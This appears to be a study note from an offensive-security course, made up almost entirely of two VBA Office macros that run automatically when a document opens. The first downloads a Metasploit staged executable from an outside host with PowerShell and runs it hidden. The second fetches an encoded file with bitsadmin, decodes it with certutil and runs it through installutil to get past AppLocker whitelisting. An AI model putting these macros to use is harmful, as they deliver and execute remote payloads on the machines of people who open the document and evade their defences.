```vb
Sub Document_Open() 
	MyMacro 
End Sub 

Sub AutoOpen() 
	MyMacro 
End Sub 

Sub MyMacro() 
	Dim str As String 
	str = "powershell (New-Object System.Net.WebClient).DownloadFile('http://192.168.49.62/msfstaged.exe', 'msfstaged.exe')" 
	Shell str, vbHide 
	Dim exePath As String 
	exePath = ActiveDocument.Path + "\msfstaged.exe" 
	Wait (2) 
	Shell exePath, vbHide 

End Sub 

Sub Wait(n As Long) 
	Dim t As Date 
	t = Now 
	Do 
		DoEvents 
	Loop Until Now >= DateAdd("s", n, t) 
End Sub 
```

Combined with AppLocker Whitelisting InstalUtil technique. (See the chapter for infos how to create and where to setup shellcode.)
[[Evasion Techniques and Breaching Defenses#8 3 3 PowerShell CLM Bypass]]
```vb
Sub Document_Open()
    MyMacro
End Sub

Sub AutoOpen()
    MyMacro
End Sub

Sub MyMacro()
    Dim str As String
    Call Shell("bitsadmin /Transfer myJob http://192.168.49.62/file.txt C:\users\student\enc.txt")
    Wait (2)
    Call Shell("certutil -decode C:\users\student\enc.txt C:\users\student\Bypass.exe")
    Wait (2)
    Call Shell("C:\Windows\Microsoft.NET\Framework64\v4.0.30319\installutil.exe /logfile= /LogToConsole=false /U C:\users\student\Bypass.exe")

    Wait (2)

End Sub

Sub Wait(n As Long)
    Dim t As Date
    t = Now
    Do
        DoEvents
    Loop Until Now >= DateAdd("s", n, t)
End Sub
```

